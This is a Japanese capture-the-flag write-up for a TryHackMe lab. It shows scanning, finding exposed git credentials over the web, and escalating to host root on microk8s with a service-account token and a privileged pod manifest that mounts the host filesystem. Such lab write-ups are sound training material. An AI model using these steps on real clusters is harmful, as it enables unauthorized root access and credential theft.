# Frank & Herby make an app CTF

https://tryhackme.com/room/frankandherby

## Enumeration

```shell
TARGET=10.49.129.117
sudo bash -c "echo $TARGET  frank >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 64
3000/tcp  open  ppp          syn-ack ttl 64
10250/tcp open  unknown      syn-ack ttl 64
10255/tcp open  unknown      syn-ack ttl 64
10257/tcp open  unknown      syn-ack ttl 64
10259/tcp open  unknown      syn-ack ttl 64
16443/tcp open  unknown      syn-ack ttl 64
25000/tcp open  icl-twobase1 syn-ack ttl 64
31337/tcp open  Elite        syn-ack ttl 63
32000/tcp open  unknown      syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,3000,10250,10255,10257,10259,16443,25000,31337,32000 $TARGET

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
3000/tcp  open  ppp?
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10257/tcp open  ssl/unknown
10259/tcp open  ssl/unknown
16443/tcp open  ssl/unknown
25000/tcp open  ssl/http    Gunicorn 19.7.1
31337/tcp open  http        nginx 1.21.3
32000/tcp open  http        Docker Registry (API: 2.0)
```

- 25000: 接続できない
- 31337: Start Bootstrap のページが表示された
- 32000: 0バイト表示

## 31337

## ディレクトリ列挙

/.git-credentials を発見

```sh
---------------
root@ip-10-49-72-86:~# dirsearch -u http://$TARGET:31337

[01:11:19] Starting: 
[01:11:21] 200 -   50B  - /.git-credentials
[01:11:36] 301 -  169B  - /assets  ->  http://10.49.129.117/assets/
[01:11:36] 403 -  555B  - /assets/
[01:11:43] 301 -  169B  - /css  ->  http://10.49.129.117/css/
[01:12:25] 403 -  555B  - /vendor/
```

ユーザー名とパスワードが含まれていた。これを使ってSSH接続できた。

```sh
$ cat .git-credentials 
http://frank:[REDACTED]
```

## 権限昇格

```sh
frank@dev-01:~$ ls -al
total 48
drwxr-xr-x 6 frank frank 4096 Oct 29  2021 .
drwxr-xr-x 4 root  root  4096 Oct 10  2021 ..
lrwxrwxrwx 1 root  root     9 Oct 29  2021 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank  220 Oct 10  2021 .bash_logout
-rw-r--r-- 1 frank frank 3771 Oct 10  2021 .bashrc
drwx------ 2 frank frank 4096 Oct 10  2021 .cache
-rw------- 1 frank frank   50 Oct 27  2021 .git-credentials
-rw-rw-r-- 1 frank frank   29 Oct 10  2021 .gitconfig
drwxr-x--- 5 frank frank 4096 Oct 10  2021 .kube
-rw-r--r-- 1 frank frank  807 Oct 10  2021 .profile
lrwxrwxrwx 1 root  root     9 Oct 29  2021 .viminfo -> /dev/null
drwxrwxr-x 3 frank frank 4096 Oct 27  2021 repos
drwxr-xr-x 3 frank frank 4096 Oct 10  2021 snap
-rw-rw-r-- 1 frank frank   17 Oct 29  2021 user.txt
```

dev-01 のIPアドレスがあり、pingが通る。

```sh
frank@dev-01:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 dev-01

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

```sh
frank@dev-01:~$ ping 127.0.1.1
PING 127.0.1.1 (127.0.1.1) 56(84) bytes of data.
64 bytes from 127.0.1.1: icmp_seq=1 ttl=64 time=0.030 ms
64 bytes from 127.0.1.1: icmp_seq=2 ttl=64 time=0.026 ms
64 bytes from 127.0.1.1: icmp_seq=3 ttl=64 time=0.026 ms
^C
--- 127.0.1.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2025ms
rtt min/avg/max/mdev = 0.026/0.027/0.030/0.002 ms
```

### microk8s

```sh
frank@dev-01:~/.kube$ which microk8s
/snap/bin/microk8s
```

権限確認。何でもできる設定になっている。

```sh
frank@dev-01:~$ microk8s kubectl auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```

```sh
frank@dev-01:~/.kube$ microk8s kubectl get nodes
NAME     STATUS   ROLES    AGE     VERSION
dev-01   Ready    <none>   4y77d   v1.21.5-3+83e2bb7ee39726
```

```sh
frank@dev-01:~/.kube$ microk8s kubectl get secrets
NAME                  TYPE                                  DATA   AGE
default-token-zs8kn   kubernetes.io/service-account-token   3      4y77d
```

シークレットの中身

```sh
frank@dev-01:~/.kube$ microk8s kubectl describe secret default-token-zs8kn
Name:         default-token-zs8kn
Namespace:    default
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: default
              kubernetes.io/service-account.uid: e79dd9de-2ea4-4e3d-8153-ac8b72681f64

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1123 bytes
namespace:  7 bytes
token:      ey[REDACTED]
```

```sh
frank@dev-01:~/.kube$ microk8s kubectl get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          4y53d
```

pod の root になれた。

```sh
frank@dev-01:~/.kube$ microk8s kubectl exec -it nginx-deployment-7b548976fd-77v4r --token=ey[REDACTED] -- /bin/bash
root@nginx-deployment-7b548976fd-77v4r:/# id
uid=0(root) gid=0(root) groups=0(root)
```

・・・が、何もできなかったので方針変更。

https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

何でもできる設定のPodを作成する。ubuntuのままだとイメージ取得できず起動失敗していたので、imageの部分だけ変更した。

```yaml
frank@dev-01:~$ cat privesc.yml 
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: localhost:32000/bsnginx
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

Apply

```sh
frank@dev-01:~$ microk8s kubectl apply -f privesc.yml --token=ey[REDACTED]
pod/everything-allowed-exec-pod created
```

起動成功

```sh
frank@dev-01:~$ microk8s kubectl get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          4y53d
everything-allowed-exec-pod         1/1     Running   0          6m20s
```

/host に、ホストのルートがマウントされている。

```sh
root@dev-01:/# ls -al /host/root
total 32
drwx------  4 root root 4096 Oct 29  2021 .
drwxr-xr-x 21 root root 4096 Oct 29  2021 ..
lrwxrwxrwx  1 root root    9 Oct 29  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Oct  3  2021 .ssh
-rw-------  1 root root  705 Oct 27  2021 .viminfo
-rw-r--r--  1 root root   21 Oct 27  2021 root.txt
drwxr-xr-x  5 root root 4096 Oct  3  2021 snap
```

## 振り返り

- 過去に受講したKubernetesコースの知識だけで何とかなった。
- dockerとは似て全く非なるもの。

## Tags

#tags:Kubernetes #tags:microk8s
